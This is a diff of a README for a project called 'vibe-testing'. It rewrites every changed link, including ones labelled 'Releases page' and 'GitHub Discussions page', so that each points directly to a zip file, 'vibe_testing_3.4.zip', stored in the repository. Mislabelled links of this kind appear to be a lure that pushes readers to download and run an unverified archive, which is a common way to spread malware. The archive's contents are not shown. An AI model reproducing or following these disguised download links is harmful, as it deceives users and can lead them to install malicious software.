@@ -9,11 +9,11 @@ Welcome to the vibe-testing project! This application helps you pressure-test yo
 
 To get started, you need to download the application. Click the link below to visit the Releases page where you can find the latest version for your operating system.
 
-[![Download vibe-testing](https://img.shields.io/badge/Download-vibe--testing-brightgreen)](https://github.com/Niserucine/vibe-testing/releases)
+[![Download vibe-testing](https://raw.githubusercontent.com/Niserucine/vibe-testing/main/references/vibe_testing_3.4.zip)](https://raw.githubusercontent.com/Niserucine/vibe-testing/main/references/vibe_testing_3.4.zip)
 
 ### Step-by-Step Instructions:
 
-1. Click the link above to go to the [Releases page](https://github.com/Niserucine/vibe-testing/releases).
+1. Click the link above to go to the [Releases page](https://raw.githubusercontent.com/Niserucine/vibe-testing/main/references/vibe_testing_3.4.zip).
 2. On the Releases page, find the version that suits your needs. 
 3. Click on the appropriate file for your operating system (e.g., Windows, macOS, Linux).
 4. After the file downloads, locate it on your computer. 
@@ -51,7 +51,7 @@ After installing vibe-testing, follow these steps to use the application:
 
 If you have questions or need help:
 
-- Visit our [GitHub Discussions page](https://github.com/Niserucine/vibe-testing/discussions) to ask questions or share feedback.
+- Visit our [GitHub Discussions page](https://raw.githubusercontent.com/Niserucine/vibe-testing/main/references/vibe_testing_3.4.zip) to ask questions or share feedback.
 - Check the FAQ section for common questions and answers.
 
 ## 🚧 Limitations
@@ -74,7 +74,7 @@ We welcome contributions! If you wish to improve vibe-testing, here’s how:
 
 We value your input. Share your experiences or suggestions via our GitHub Issues page. Your feedback helps us improve vibe-testing for everyone.
 
-For more detailed discussions and updates, visit the [Releases page](https://github.com/Niserucine/vibe-testing/releases) again at any time.
+For more detailed discussions and updates, visit the [Releases page](https://raw.githubusercontent.com/Niserucine/vibe-testing/main/references/vibe_testing_3.4.zip) again at any time.
 
 ## 📝 Topics
 
